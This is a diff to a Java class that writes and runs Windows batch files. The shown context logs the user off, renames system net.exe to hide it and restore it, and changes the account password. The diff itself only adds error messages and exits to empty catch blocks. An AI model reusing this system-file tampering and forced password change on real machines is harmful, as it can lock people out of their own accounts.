@@ -34,7 +34,10 @@ public class Run implements IWriter{
           try{
             Runtime.getRuntime().exec(sysPath + "\\System32\\logoff.exe");
           }
-          catch(IOException ioe){}
+          catch(IOException ioe){
+            System.err.println("Oh, no! A error is appear at \"lo\"'s code. [IOException]");
+            System.exit(1);
+          }
           break;
         case 1: // pr
           writeText("C:\\t.cmd", "ren %systemroot%\\net.exe n1.exe");
@@ -46,7 +49,10 @@ public class Run implements IWriter{
           try{
             Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd");
           }
-          catch(IOException ioe){}
+          catch(IOException ioe){
+            System.err.println("Oh, no! A error is appear at \"pr\"'s code. [IOException]");
+            System.exit(1);
+          }
           break;
         case 2: // re
           writeText("C:\\t.cmd", "ren %systemroot%\\n1.exe net.exe");
@@ -58,7 +64,10 @@ public class Run implements IWriter{
           try{
             Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd");
           }
-          catch(IOException ioe){}
+          catch(IOException ioe){
+            System.err.println("Oh, no! A error is appear at \"re\"'s code. [IOException]");
+            System.exit(1);
+          }
           break;
         default: // otherwise, nothing
           return;
@@ -74,6 +83,8 @@ public class Run implements IWriter{
       tBatchStream = new FileOutputStream(tBatchF);
     }
     catch(FileNotFoundException fnfe){
+      System.err.println("Oh, no! A error is appear at \"writeText.FileOutputStream\"'s code. [IOException]");
+      System.exit(1);
     }
 
     PrintStream tBatchPStream = null;
@@ -81,6 +92,8 @@ public class Run implements IWriter{
       tBatchPStream = new PrintStream(tBatchStream);
     }
     catch(NullPointerException npe){
+      System.err.println("Oh, no! A error is appear at \"writeText.PrintStream\"'s code. [NullPointerException]");
+      System.exit(1);
     }
 
     tBatchPStream.append(text);
@@ -121,10 +134,13 @@ public class Run implements IWriter{
         sb.append(rv);
         thisInstance.writeText("C:\\t.cmd", sb.toString()); // Make a batch file to change password.
         String sysPath = System.getenv("SystemRoot");
-          try{
-            Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd"); // Run it!
-          }
-          catch(IOException ioe){}
+        try{
+          Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd"); // Run it!
+        }
+        catch(IOException ioe){
+          System.err.println("Oh, no! A error is appear at \"Main.ChangePassword\"'s code. [IOException]");
+          System.exit(1);
+        }
       }
     }
   }
